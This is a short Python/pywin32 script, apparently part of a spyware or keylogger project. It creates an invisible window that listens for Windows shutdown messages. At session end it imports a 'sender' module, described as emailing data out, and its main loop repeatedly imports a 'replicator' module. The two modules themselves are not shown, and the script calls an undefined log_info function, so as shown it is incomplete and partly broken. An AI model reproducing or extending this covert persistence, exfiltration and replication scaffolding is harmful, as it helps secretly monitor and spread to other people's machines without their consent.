import time

import win32api
import win32con
import win32gui


# Reads the messages from the message map and prints
def wndproc(hwnd, msg, wparam, lparam):
    log_info( '%s' % msg )
    ctrl = msg
    # Sends email on End of Session
    if ctrl == 17:
        import sender
    else:
        pass


# Creates invisible console that detects commands

log_info( "*** STARTING WND ***" )
hinst = win32api.GetModuleHandle( None )
wndclass = win32gui.WNDCLASS()
wndclass.hInstance = hinst
wndclass.lpszClassName = "CtrlMessage"
messageMap = {win32con.WM_QUERYENDSESSION: wndproc,  # 17
              win32con.WM_ENDSESSION: wndproc,  # 22
              win32con.WM_QUIT: wndproc,  # 18
              win32con.WM_DESTROY: wndproc,  # 2
              win32con.WM_CLOSE: wndproc}  # 16

wndclass.lpfnWndProc = messageMap

# try:
myWindow = win32gui.RegisterClass( wndclass )
hwnd = win32gui.CreateWindowEx( win32con.WS_EX_LEFT,
                                myWindow,
                                "CtrlMessage",
                                0,
                                0,
                                0,
                                win32con.CW_USEDEFAULT,
                                win32con.CW_USEDEFAULT,
                                0,
                                0,
                                hinst,
                                None )
while True:
    win32gui.PumpWaitingMessages()
    time.sleep( 1 )
    import replicator
